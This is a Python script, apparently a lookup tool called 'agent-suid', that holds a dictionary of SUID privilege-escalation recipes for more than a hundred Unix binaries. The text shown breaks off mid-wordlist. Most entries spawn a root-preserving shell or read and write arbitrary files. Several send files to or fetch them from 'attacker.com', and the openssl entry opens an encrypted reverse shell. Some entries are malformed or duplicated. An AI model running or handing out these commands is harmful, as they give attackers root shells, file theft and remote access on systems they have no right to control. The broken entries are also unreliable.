#!/usr/bin/env python3


import os
import sys
import shutil


def display_help():
    help_text = """
    Agent-SUID Script

    Usage:
      agent-suid [OPTIONS]

    Options:
      --help          Show this message and exit.
      --install       Install this script to /usr/local/bin. (The installation process requires superuser (sudo) permissions.)
      --uninstall     Uninstall this script. (The installation process requires superuser (sudo) permissions.)
    """
    print(help_text)


# Map each binary 
commands = {
    "aa-exec": """aa-exec:
        sudo install -m =xs $(which aa-exec) .
        ./aa-exec /bin/sh -p
        """,

    "ab": """ab:
        sudo install -m =xs $(which ab) .
        URL=http://attacker.com/
        LFILE=file_to_send
        ./ab -p $LFILE $URL
        """,

    "agetty": """agetty:
        sudo install -m =xs $(which agetty) .
        ./agetty -o -p -l /bin/sh -a root tty
        """,

    "alpine": """alpine:
        sudo install -m =xs $(which alpine) .
        LFILE=file_to_read
        ./alpine -F "$LFILE
        """,

    "ar": """ar:
        sudo install -m =xs $(which ar) .
        TF=$(mktemp -u)
        LFILE=file_to_read
        ./ar r "$TF" "$LFILE"
        cat "$TF"
        """,

    "arj": """arj:
        sudo install -m =xs $(which arj) .
        TF=$(mktemp -d)
        LFILE=file_to_write
        LDIR=where_to_write
        echo DATA >"$TF/$LFILE"
        arj a "$TF/a" "$TF/$LFILE"
        ./arj e "$TF/a" $LDIR
        """,

    "arp": """arp:
        sudo install -m =xs $(which arp) .
        LFILE=file_to_read
        ./arp -v -f "$LFILE"
        """,

    "as": """as:
        sudo install -m =xs $(which as) .
        LFILE=file_to_read
        ./as @$LFILE
        """,

    "ascii-xfr": """ascii-xfr:
        sudo install -m =xs $(which ascii-xfr) .
        LFILE=file_to_read
        ./ascii-xfr -ns "$LFILE"
        """,

    "ash": """ash:
        sudo install -m =xs $(which ash) .
        ./ash
        """,

    "aspell": """aspell:
        sudo install -m =xs $(which aspell) .
        LFILE=file_to_read
        ./aspell -c "$LFILE"
        """,

    "atobm": """atobm:
        sudo install -m =xs $(which atobm) .
        LFILE=file_to_read
        ./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}"
        """,

    "awk": """awk:
        sudo install -m =xs $(which awk) .
        LFILE=file_to_read
        ./awk '//' "$LFILE"
        """,

    "base32": """base32:
        sudo install -m =xs $(which base32) .
        LFILE=file_to_read
        base32 "$LFILE" | base32 --decode
        """,

    "base64": """base64:
        sudo install -m =xs $(which base64) .
        LFILE=file_to_read
        ./base64 "$LFILE" | base64 --decode
        """,

    "basenc": """basenc:
        sudo install -m =xs $(which basenc) .
        LFILE=file_to_read
        basenc --base64 $LFILE | basenc -d --base
        """,

    "basez": """basez:
        sudo install -m =xs $(which basez) .
        LFILE=file_to_read
        ./basez "$LFILE" | basez --decode
        """,

    "bash": """bash:
        sudo install -m =xs $(which bash) .
        ./bash -p
        """,

    "bc": """bc:
        sudo install -m =xs $(which bc) .
        LFILE=file_to_read
        ./bc -s $LFILE
        quit
        """,

    "bridge": """bridge:
        sudo install -m =xs $(which bridge) .
        LFILE=file_to_read
        ./bridge -b "$LFILE"
        """,

    "busctl": """busctl:
        sudo install -m =xs $(which busctl) .
        ./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
        """,

    "busybox": """busybox:
        sudo install -m =xs $(which busybox) .
        ./busybox sh
        """,

    "bzip2": """bzip2:
        sudo install -m =xs $(which bzip2) .
        LFILE=file_to_read
        ./bzip2 -c $LFILE | bzip2 -d
        """,

    "cabal": """cabal:
        sudo install -m =xs $(which cabal) .
        ./cabal exec -- /bin/sh -p
        """,

    "capsh": """capsh:
        sudo install -m =xs $(which capsh) .
        ./capsh --gid=0 --uid=0 --
        """,

    "cat": """cat:
        sudo install -m =xs $(which cat) .
        LFILE=file_to_read
        ./cat "$LFILE"
        """,

    "chmod": """chmod:
        sudo install -m =xs $(which chmod) .
        LFILE=file_to_change
        ./chmod 6777 $LFILE
        """,

    "choom": """choom:
        sudo install -m =xs $(which choom) .
        ./choom -n 0 -- /bin/sh -p
        """,

    "chown": """chown:
        sudo install -m =xs $(which chown) .
        LFILE=file_to_change
        ./chown $(id -un):$(id -gn) $LFILE
        """,

    "chroot": """chroot:
        sudo install -m =xs $(which chroot) .
        ./chroot / /bin/sh -p
        """,

    "clamscan": """clamscan:
        sudo install -m =xs $(which clamscan) .
        LFILE=file_to_read
        TF=$(mktemp -d)
        touch $TF/empty.yara
        ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
        """,

    "cmp": """cmp:
        sudo install -m =xs $(which cmp) .
        LFILE=file_to_read
        ./cmp $LFILE /dev/zero -b -l
        """,

    "column": """column:
        sudo install -m =xs $(which column) .
        LFILE=file_to_read
        ./column $LFILE
        """,

    "comm": """comm:
        sudo install -m =xs $(which comm) .
        LFILE=file_to_read
        comm $LFILE /dev/null 2>/dev/null
        """,

    "cp": """cp:
        1. sudo install -m =xs $(which cp) .
           LFILE=file_to_write
           echo "DATA" | ./cp /dev/stdin "$LFILE"
        2. sudo install -m =xs $(which cp) .
           LFILE=file_to_write
           echo "DATA" | ./cp /dev/stdin "$LFILE"
        3. sudo install -m =xs $(which cp) .
           LFILE=file_to_change
           ./cp --attributes-only --preserve=all ./cp "$LFILE"
           """,

    "cpio": """cpio:
        1. sudo install -m =xs $(which cpio) .
           LFILE=file_to_read
           TF=$(mktemp -d)
           echo "$LFILE" | ./cpio -R $UID -dp $TF
           cat "$TF/$LFILE"
        2. sudo install -m =xs $(which cpio) .
           LFILE=file_to_write
           LDIR=where_to_write
           echo DATA >$LFILE
           echo $LFILE | ./cpio -R 0:0 -p $LDIR
           """,

    "cpulimit": """cpulimit:
        sudo install -m =xs $(which cpulimit) .
        ./cpulimit -l 100 -f -- /bin/sh -p
        """,

    "csh": """csh:
        sudo install -m =xs $(which csh) .
        ./csh -b
        """,

    "csplit": """csplit:
        sudo install -m =xs $(which csplit) .
        LFILE=file_to_read
        csplit $LFILE 1
        cat xx01
        """,

    "csvtool": """csvtool:
        sudo install -m =xs $(which csvtool) .
        LFILE=file_to_read
        ./csvtool trim t $LFILE
        """,

    "curl": """curl:
        sudo install -m =xs $(which curl) .
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        ./curl $URL -o $LFILE
        """,

    "cut": """cut:
        sudo install -m =xs $(which cut) .
        LFILE=file_to_read
        ./cut
       """,
    "dash": """dash:
        sudo install -m =xs $(which dash) .
        ./dash -p""",
    "date": """date:
        sudo install -m =xs $(which date) .
        LFILE=file_to_read
        ./date -f $LFILE""",
    "dd": """dd:
        sudo install -m =xs $(which dd) .
        LFILE=file_to_write
        echo "data" | ./dd of=$LFILE""",
    "debugfs": """debugfs:
        sudo install -m =xs $(which debugfs) .
        ./debugfs
        !/bin/sh""",
    "dialog": """dialog:
        sudo install -m =xs $(which dialog) .
        LFILE=file_to_read
        ./dialog --textbox "$LFILE" 0 0""",
    "diff": """diff:
        sudo install -m =xs $(which diff) .
        LFILE=file_to_read
        ./diff --line-format=%L /dev/null $LFILE""",
    "dig": """dig:
        sudo install -m =xs $(which dig) .
        LFILE=file_to_read
        ./dig -f $LFILE""",
    "distcc": """distcc:
        sudo install -m =xs $(which distcc) .
        ./distcc /bin/sh -p""",
    "dmsetup": """dmsetup:
        sudo install -m =xs $(which dmsetup) .
        ./dmsetup create base <<EOF
        0 3534848 linear /dev/loop0 94208
        EOF
        ./dmsetup ls --exec '/bin/sh -p -s'""",
    "docker": """docker:
        sudo install -m =xs $(which docker) .
        ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh""",
    "dosbox": """dosbox:
        sudo install -m =xs $(which dosbox) .
        LFILE='\\path\\to\\file_to_write'
        ./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit""",
    "ed": """ed:
        sudo install -m =xs $(which ed) .
        ./ed file_to_read
        ,p
        q""",
    "efax": """efax:
        sudo install -m =xs $(which efax) .
        LFILE=file_to_read
        ./efax -d "$LFILE""",
    "elvish": """elvish:
        sudo install -m =xs $(which elvish) .
        ./elvish""",
    "emacs": """emacs:
        sudo install -m =xs $(which emacs) .
        ./emacs -Q -nw --eval '(term "/bin/sh -p")'""",
    "env": """env:
        sudo install -m =xs $(which env) .
        ./env /bin/sh -p""",
    "eqn": """eqn:
        sudo install -m =xs $(which eqn) .
        LFILE=file_to_read
        ./eqn "$LFILE""",
    "espeak": """espeak:
        sudo install -m =xs $(which espeak) .
        LFILE=file_to_read
        ./espeak -qXf "$LFILE""",
    "expand": """expand:
        sudo install -m =xs $(which expand) .
        LFILE=file_to_read
        ./expand "$LFILE""",
    "expect": """expect:
        sudo install -m =xs $(which expect) .
        ./expect -c 'spawn /bin/sh -p;interact'""",
    "file": """file:
        sudo install -m =xs $(which file) .
        LFILE=file_to_read
        ./file -f $LFILE""",
    "find": """find:
        sudo install -m =xs $(which find) .
        ./find . -exec /bin/sh -p \\; -quit""",
    "fish": """fish:
        sudo install -m =xs $(which fish) .
        ./fish""",
    "flock": """flock:
        sudo install -m =xs $(which flock) .
        ./flock -u / /bin/sh -p""",
    "fmt": """fmt:
        sudo install -m =xs $(which fmt) .
        LFILE=file_to_read
        ./fmt -999 "$LFILE""",
    "fold": """fold:
        sudo install -m =xs $(which fold) .
        LFILE=file_to_read
        ./fold -w99999999 "$LFILE""",
    "gawk": """gawk:
        sudo install -m =xs $(which gawk) .
        LFILE=file_to_read
        ./gawk '//' "$LFILE""",
    "gcore": """gcore:
        sudo install -m =xs $(which gcore) .
        ./gcore $PID""",
    "gdb": """gdb:
        sudo install -m =xs $(which gdb) .
        ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit""",
    "genie": """genie:
        sudo install -m =xs $(which genie) .
        ./genie -c '/bin/sh'""",
    "genisoimage": """genisoimage:
        sudo install -m =xs $(which genisoimage) .
        LFILE=file_to_read
        ./genisoimage -sort "$LFILE""",
    "gimp": """gimp:
        sudo install -m =xs $(which gimp) .
        ./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'""",
    "grep": """grep:
        sudo install -m =xs $(which grep) .
        LFILE=file_to_read
        ./grep '' $LFILE""",
    "gtester": """gtester:
        sudo install -m =xs $(which gtester) .
        TF=$(mktemp)
        echo '#!/bin/sh -p' > $TF
        echo 'exec /bin/sh -p 0<&1' >> $TF
        chmod +x $TF
        sudo gtester -q $TF""",
    "gzip": """gzip:
        sudo install -m =xs $(which gzip) .
        LFILE=file_to_read
        ./gzip -f $LFILE -t""",
    "hd": """hd:
        sudo install -m =xs $(which hd) .
        LFILE=file_to_read
        ./hd "$LFILE""",
    "head": """head:
        sudo install -m =xs $(which head) .
        LFILE=file_to_read
        ./head -c1G "$LFILE""",
    "hexdump": """hexdump:
        sudo install -m =xs $(which hexdump) .
        LFILE=file_to_read
        ./hexdump -C "$LFILE""",
    "highlight": """highlight:
        sudo install -m =xs $(which highlight) .
        LFILE=file_to_read
        ./highlight --no-doc --failsafe "$LFILE""",
    "hping3": """hping3:
        sudo install -m =xs $(which hping3) .
        ./hping3
        /bin/sh -p""",
    "iconv": """iconv:
        sudo install -m =xs $(which iconv) .
        LFILE=file_to_read
        ./iconv -f 8859_1 -t 8859_1 "$LFILE"
        """,

    "install": """install:
        sudo install -m =xs $(which install) .
        LFILE=file_to_change
        TF=$(mktemp)
        ./install -m 6777 $LFILE $TF
        """,

    "ionice": """ionice:
        sudo install -m =xs $(which ionice) .
        ./ionice /bin/sh -p
        """,

    "ip": """ip:
        1. sudo install -m =xs $(which ip) .
           LFILE=file_to_read
           ./ip -force -batch "$LFILE"
        2. sudo install -m =xs $(which ip) .
           ./ip netns add foo
           ./ip netns exec foo /bin/sh -p
           ./ip netns delete foo
        """,

    "ispell": """ispell:
        sudo install -m =xs $(which ispell) .
        ./ispell /etc/passwd
        !/bin/sh -p
        """,

    "jjs": r"""jjs:
        sudo install -m =xs $(which jjs) .
        echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
        """,

    "join": """join:
        sudo install -m =xs $(which join) .
        LFILE=file_to_read
        ./join -a 2 /dev/null $LFILE
        """,

    "jq": """jq:
        sudo install -m =xs $(which jq) .
        LFILE=file_to_read
        ./jq -Rr . "$LFILE"
        """,

    "jrunscript": r"""jrunscript:
        sudo install -m =xs $(which jrunscript) .
        ./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
        """,

    "julia": """julia:
        sudo install -m =xs $(which julia) .
        ./julia -e 'run(`/bin/sh -p`)'
        """,

    "ksh": """ksh:
        sudo install -m =xs $(which ksh) .
        ./ksh -p
        """,

    "ksshell": """ksshell:
        sudo install -m =xs $(which ksshell) .
        LFILE=file_to_read
        ./ksshell -i $LFILE
        """,

    "kubectl": """kubectl:
        sudo install -m =xs $(which kubectl) .
        LFILE=dir_to_serve
        ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
        """,

    "ld.so": """ld.so:
        sudo install -m =xs $(which ld.so) .
        ./ld.so /bin/sh -p
        """,

    "less": """less:
        sudo install -m =xs $(which less) .
        ./less file_to_read
        """,

    "links": """links:
        sudo install -m =xs $(which links) .
        LFILE=file_to_read
        ./links "$LFILE"
        """,

    "logsave": """logsave:
        sudo install -m =xs $(which logsave) .
        ./logsave /dev/null /bin/sh -i -p
        """,

    "look": """look:
        sudo install -m =xs $(which look) .
        LFILE=file_to_read
        ./look '' "$LFILE"
        """,

    "lua": """lua:
        sudo install -m =xs $(which lua) .
        lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
        """,

    "make": r"""make:
        sudo install -m =xs $(which make) .
        COMMAND='/bin/sh -p'
        ./make -s --eval=$'x:\n\t-'"$COMMAND"
        """,

    "mawk": """mawk:
        sudo install -m =xs $(which mawk) .
        LFILE=file_to_read
        ./mawk '//' "$LFILE"
        """,

    "minicom": """minicom:
        sudo install -m =xs $(which minicom) .
        ./minicom -D /dev/nul
        """,

    "more": """more:
        sudo install -m =xs $(which more) .
        ./more file_to_read
        """,

    "mosquitto": """mosquitto:
        sudo install -m =xs $(which mosquitto) .
        LFILE=file_to_read
        ./mosquitto -c "$LFILE"
        """,

    "msgattrib": """msgattrib:
        sudo install -m =xs $(which msgattrib) .
        LFILE=file_to_read
        ./msgattrib -P $LFILE
        """,

    "msgcat": """msgcat:
        sudo install -m =xs $(which msgcat) .
        LFILE=file_to_read
        ./msgcat -P $LFILE
        """,

    "msgconv": """msgconv:
        sudo install -m =xs $(which msgconv) .
        LFILE=file_to_read
        ./msgconv -P $LFILE
        """,

    "msgfilter": """msgfilter:
        sudo install -m =xs $(which msgfilter) .
        echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
        """,

    "msgmerge": """msgmerge:
        sudo install -m =xs $(which msgmerge) .
        LFILE=file_to_read
        ./msgmerge -P $LFILE /dev/null
        """,

    "msguniq": """msguniq:
        sudo install -m =xs $(which msguniq) .
        LFILE=file_to_read
        ./msguniq -P $LFILE
        """,

    "multitime": """multitime:
        sudo install -m =xs $(which multitime) .
        ./multitime /bin/sh -p
        """,

    "mv": """mv:
        sudo install -m =xs $(which mv) .
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        ./mv $TF $LFILE
        """,

    "nasm": """nasm:
        sudo install -m =xs $(which nasm) .
        LFILE=file_to_read
        ./nasm -@ $LFILE
        """,

    "nawk": """nawk:
        sudo install -m =xs $(which nawk) .
        LFILE=file_to_read
        ./nawk '//' "$LFILE"
        """,

    "ncftp": """ncftp:
        sudo install -m =xs $(which ncftp) .
        ./ncftp
        !/bin/sh -p
        """,

    "nft": """nft:
        sudo install -m =xs $(which nft) .
        LFILE=file_to_read
        ./nft -f "$LFILE"
        """,

    "nice": """nice:
        sudo install -m =xs $(which nice) .
        ./nice /bin/sh -p
        """,

    "nl": """nl:
        sudo install -m =xs $(which nl) .
        LFILE=file_to_read
        ./nl -bn -w1 -s '' $LFILE
        """,

    "nm": """nm:
        sudo install -m =xs $(which nm) .
        LFILE=file_to_read
        ./nm @$LFILE
        """,

    "nmap": """nmap:
        sudo install -m =xs $(which nmap) .
        LFILE=file_to_write
        ./nmap -oG=$LFILE DATA
        """,

    "node": """node:
        sudo install -m =xs $(which node) .
        ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
        """,

    "nohup": """nohup:
        sudo install -m =xs $(which nohup) .
        ./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
        """,

    "ntpdate": """ntpdate:
        sudo install -m =xs $(which ntpdate) .
        LFILE=file_to_read
        ./ntpdate -a x -k $LFILE -d localhost
        """,
    "od": """od:
        sudo install -m =xs $(which od) .
        LFILE=file_to_read
        ./od -An -c -w9999 "$LFILE"
        """,

    "openssl": """openssl:
        1. To receive the shell run the following on the attacker box:
        openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
        openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
        Communication between attacker and target will be encrypted

        sudo install -m =xs $(which openssl) .
        RHOST=attacker.com
        RPORT=12345
        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s

        2.
        sudo install -m =xs $(which openssl) .
        LFILE=file_to_write
        echo DATA | openssl enc -out "$LFILE"
        """,

    "openvpn": """openvpn:
        1.
        sudo install -m =xs $(which openvpn) .
        ./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'

        2.
        sudo install -m =xs $(which openvpn) .
        LFILE=file_to_read
        ./openvpn --config "$LFILE"
        """,

    "pandoc": """pandoc:
        sudo install -m =xs $(which pandoc) .
        LFILE=file_to_write
        echo DATA | ./pandoc -t plain -o "$LFILE"
        """,

    "paste": """paste:
        sudo install -m =xs $(which paste) .
        LFILE=file_to_read
        paste $LFILE
        """,

    "perf": """perf:
        sudo install -m =xs $(which perf) .
        ./perf stat /bin/sh -p
        """,

    "perl": """perl:
        sudo install -m =xs $(which perl) .
        ./perl -e 'exec "/bin/sh";'
        """,

    "pexec": """pexec:
        sudo install -m =xs $(which perl) .
        ./perl -e 'exec "/bin/sh";'
        """,

    "pg": """pg:
        sudo install -m =xs $(which pg) .
        ./pg file_to_read
        """,

    "php": """php:
        sudo install -m =xs $(which php) .
        CMD="/bin/sh"
        ./php -r "pcntl_exec('/bin/sh', ['-p']);"
        """,

    "pidstat": """pidstat:
        sudo install -m =xs $(which pidstat) .
        COMMAND=id
        ./pidstat -e $COMMAND
        """,

    "pr": """pr:
        sudo install -m =xs $(which pr) .
        LFILE=file_to_read
        pr -T $LFILE
        """,

    "ptx": """ptx:
        sudo install -m =xs $(which ptx) .
        LFILE=file_to_read
        ./ptx -w 5000 "$LFILE"
        """,

    "python": """python:
        sudo install -m =xs $(which python) .
        ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
        """,

    "rc": """rc:
        sudo install -m =xs $(which rc) .
        ./rc -c '/bin/sh -p'
        """,

    "readelf": """readelf:
        sudo install -m =xs $(which readelf) .
        LFILE=file_to_read
        ./readelf -a @$LFILE
        """,

    "restic": """restic:
        sudo install -m =xs $(which restic) .
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_or_dir_to_get
        NAME=backup_name
        ./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
        """,

    "rev": """rev:
        sudo install -m =xs $(which rev) .
        LFILE=file_to_read
        ./rev $LFILE | rev
        """,

    "rlwrap": """rlwrap:
        sudo install -m =xs $(which rlwrap) .
        ./rlwrap -H /dev/null /bin/sh -p
        """,

    "rsync": """rsync:
        sudo install -m =xs $(which rsync) .
        ./rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
        """,

    "rtorrent": """rtorrent:
        sudo install -m =xs $(which rtorrent) .
        echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
        ./rtorrent
        """,

    "run-parts": """run-parts:
        sudo install -m =xs $(which run-parts) .
        ./run-parts --new-session --regex '^sh$' /bin --arg='-p'
        """,

    "rview": """rview:
        sudo install -m =xs $(which rview) .
        ./rview -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
        """,

    "rvim": """rvim:
        sudo install -m =xs $(which rvim) .
        ./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
        """,

    "sash": """sash:
        sudo install -m =xs $(which sash) .
        ./sash
        """,

    "scanmem": """scanmem:
        sudo install -m =xs $(which scanmem) .
        ./scanmem
        shell /bin/sh
        """,

    "sed": """sed:
        sudo install -m =xs $(which sed) .
        LFILE=file_to_read
        ./sed -e '' "$LFILE"
        """,

    "setarch": """setarch:
        sudo install -m =xs $(which setarch) .
        ./setarch $(arch) /bin/sh -p
        """,

    "setfacl": """setfacl:
        sudo install -m =xs $(which setfacl) .
        LFILE=file_to_change
        USER=somebody
        ./setfacl -m u:$USER:rwx $LFILE
        """,

    "setlock": """setlock:
        sudo install -m =xs $(which setlock) .
        ./setlock - /bin/sh -p
        """,

    "shuf": """shuf:
        sudo install -m =xs $(which shuf) .
        LFILE=file_to_write
        ./shuf -e DATA -o "$LFILE"
        """,

    "soelim": """soelim:
        sudo install -m =xs $(which soelim) .
        LFILE=file_to_read
        ./soelim "$LFILE"
        """,

    "softlimit": """softlimit:
        sudo install -m =xs $(which softlimit) .
        ./softlimit /bin/sh -p
        """,

    "sort": """sort:
        sudo install -m =xs $(which sort) .
        LFILE=file_to_read
        ./sort -m "$LFILE"
        """,

    "sqlite3": """sqlite3:
        sudo install -m =xs $(which sqlite3) .
        LFILE=file_to_read
        sqlite3 << EOF
        CREATE TABLE t(line TEXT);
        .import $LFILE t
        SELECT * FROM t;
        EOF
        """,

    "ss": """ss:
        sudo install -m =xs $(which ss) .
        LFILE=file_to_read
        ./ss -a -F $LFILE
        """,

    "ssh-agent": """ssh-agent:
        sudo install -m =xs $(which ssh-agent) .
        ./ssh-agent /bin/ -p
        """,

    "ssh-keygen": """ssh-keygen:
        sudo install -m =xs $(which ssh-keygen) .
        ./ssh-keygen -D ./lib.so
        """,

    "ssh-keyscan": """ssh-keyscan:
        sudo install -m =xs $(which ssh-keyscan) .
        LFILE=file_to_read
        ./ssh-keyscan -f $LFILE
        """,

    "sshpass": """sshpass:
        sudo install -m =xs $(which sshpass) .
        ./sshpass /bin/sh -p
        """,

    "start-stop-daemon": """start-stop-daemon:
        sudo install -m =xs $(which start-stop-daemon) .
        ./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
        """,

    "stdbuf": """stdbuf:
        sudo install -m =xs $(which stdbuf) .
        ./stdbuf -i0 /bin/sh -p
        """,

    "strace": """strace:
        sudo install -m =xs $(which strace) .
        ./strace -o /dev/null /bin/sh -p
        """,

    "strings": """strings:
        sudo install -m =xs $(which strings) .
        LFILE=file_to_read
        ./strings "$LFILE"
        """,

    "sysctl": """sysctl:
        sudo install -m =xs $(which sysctl) .
        COMMAND='/bin/sh -c id>/tmp/id'
        ./sysctl "kernel.core_pattern=|$COMMAND"
        sleep 9999 &
        kill -QUIT $!
        cat /tmp/id
        """,

    "systemctl": """systemctl:
        sudo install -m =xs $(which systemctl) .
        TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        ./systemctl link $TF
        ./systemctl enable --now $TF
        """,

    "tac": """tac:
        sudo install -m =xs $(which tac) .
        LFILE=file_to_read
        ./tac -s 'RANDOM' "$LFILE"
        """,

    "tail": """tail:
        sudo install -m =xs $(which tail) .
        LFILE=file_to_read
        ./tail -c1G "$LFILE"
        """,

    "taskset": """taskset:
        sudo install -m =xs $(which taskset) .
        ./taskset 1 /bin/sh -p
        """,

    "tbl": """tbl:
        sudo install -m =xs $(which tbl) .
        LFILE=file_to_read
        ./tbl $LFILE
        """,

    "tclsh": """tclsh:
        sudo install -m =xs $(which tclsh) .
        ./tclsh
        exec /bin/sh -p <@stdin >@stdout 2>@stderr
        """,

    "tee": """tee:
        sudo install -m =xs $(which tee) .
        LFILE=file_to_write
        echo DATA | ./tee -a "$LFILE"
        """,

    "terraform": """terraform:
        sudo install -m =xs $(which terraform) .
        ./terraform console
        file("file_to_read")
        """,

    "tftp": """tftp:
        sudo install -m =xs $(which tftp) .
        RHOST=attacker.com
        ./tftp $RHOST
        put file_to_send
        """,

    "tic": """tic:
        sudo install -m =xs $(which tic) .
        LFILE=file_to_read
        ./tic -C "$LFILE"
        """,

    "time": """time:
        sudo install -m =xs $(which time) .
        ./time /bin/sh -p
        """,

    "timeout": """timeout:
        sudo install -m =xs $(which timeout) .
        ./timeout 7d /bin/sh -p
        """,

    "troff": """troff:
        sudo install -m =xs $(which troff) .
        LFILE=file_to_read
        ./troff $LFILE
        """,

    "ul": """ul:
        sudo install -m =xs $(which ul) .
        LFILE=file_to_read
        ./ul "$LFILE"
        """,

    "unexpand": """unexpand:
        sudo install -m =xs $(which unexpand) .
        LFILE=file_to_read
        ./unexpand -t99999999 "$LFILE"
        """,

    "uniq": """uniq:
        sudo install -m =xs $(which uniq) .
        LFILE=file_to_read
        ./uniq "$LFILE"
        """,

    "unshare": """unshare:
        sudo install -m =xs $(which unshare) .
        ./unshare -r /bin/sh
        """,

    "unsquashfs": """unsquashfs:
        sudo install -m =xs $(which unsquashfs) .
        ./unsquashfs shell
        ./squashfs-root/sh -p
        """,

    "unzip": """unzip:
        sudo install -m =xs $(which unzip) .
        ./unzip -K shell.zip
        ./sh -p
        """,

    "update-alternatives": """update-alternatives:
        sudo install -m =xs $(which update-alternatives) .
        LFILE=/path/to/file_to_write
        TF=$(mktemp)
        echo DATA >$TF
        ./update-alternatives --force --install "$LFILE" x "$TF" 0
        """,

    "uudecode": """uudecode:
        sudo install -m =xs $(which uudecode) .
        LFILE=file_to_read
        uuencode "$LFILE" /dev/stdout | uudecode
        """,

    "uuencode": """uuencode:
        sudo install -m =xs $(which uuencode) .
        LFILE=file_to_read
        uuencode "$LFILE" /dev/stdout | uudecode
        """,

    "vagrant": """vagrant:
        sudo install -m =xs $(which vagrant) .
        cd $(mktemp -d)
        echo 'exec "/bin/sh -p"' > Vagrantfile
        vagrant up
        """,

    "varnishncsa": """varnishncsa:
        sudo install -m =xs $(which varnishncsa) .
        LFILE=file_to_write
        ./varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
        """,

    "view": """view:
        sudo install -m =xs $(which view) .
        ./view -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
        """,

    "vigr": """vigr:
        sudo install -m =xs $(which vigr) .
        ./vigr
        """,

    "vim": """vim:
        sudo install -m =xs $(which vim) .
        ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
        """,

    "vimdiff": """vimdiff:
        sudo install -m =xs $(which vimdiff) .
        ./vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
        """,

    "vipw": """vipw:
        sudo install -m =xs $(which vipw) .
        ./vipw
        """,

    "w3m": """w3m:
        sudo install -m =xs $(which w3m) .
        LFILE=file_to_read
        ./w3m "$LFILE" -dump
        """,

    "watch": """watch:
        sudo install -m =xs $(which watch) .
        ./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
        """,

    "wc": """wc:
        sudo install -m =xs $(which wc) .
        LFILE=file_to_read
        ./wc --files0-from "$LFILE"
        """,

    "wget": r"""wget:
        sudo install -m =xs $(which wget) .
        TF=$(mktemp)
        chmod +x $TF
        echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
        ./wget --use-askpass=$TF 0
        """,

    "whiptail": """whiptail:
        sudo install -m =xs $(which whiptail) .
        LFILE=file_to_read
        ./whiptail --textbox --scrolltext "$LFILE" 0 0
        """,

    "xargs": """xargs:
        sudo install -m =xs $(which xargs) .
        ./xargs -a /dev/null sh -p
        """,

    "xdotool": """xdotool:
        sudo install -m =xs $(which xdotool) .
        ./xdotool exec --sync /bin/sh -p
        """,

    "xmodmap": """xmodmap:
        sudo install -m =xs $(which xmodmap) .
        LFILE=file_to_read
        ./xmodmap -v $LFILE
        """,

    "xmore": """xmore:
        sudo install -m =xs $(which xmore) .
        LFILE=file_to_read
        ./xmore $LFILE
        """,

    "xxd": """xxd:
        sudo install -m =xs $(which xxd) .
        LFILE=file_to_read
        ./xxd "$LFILE" | xxd -r
        """,

    "xz": """xz:
        sudo install -m =xs $(which xz) .
        LFILE=file_to_read
        ./xz -c "$LFILE" | xz -d
        """,

    "yash": """yash:
        sudo install -m =xs $(which yash) .
        ./yash
        """,

    "zsh": """zsh:
        sudo install -m =xs $(which zsh) .
        ./zsh
        """,

    "zsoelim": """zsoelim:
        sudo install -m =xs $(which zsoelim) .
        LFILE=file_to_read
        ./zsoelim "$LFILE"
        """
}

# SUID binaries to the wordlist
wordlist = [
    "aa-exec", "ab", "agetty", "alpine", "ar", "arj", "arp", "as", "ascii-xfr", "ash", "aspell",
    "atobm", "awk", "base32", "base64", "basenc", "basez", "bash", "bc", "bridge", "busctl",
    "busybox", "bzip2", "cabal", "capsh", "cat", "chmod", "choom", "chown", "chroot", "clamscan",
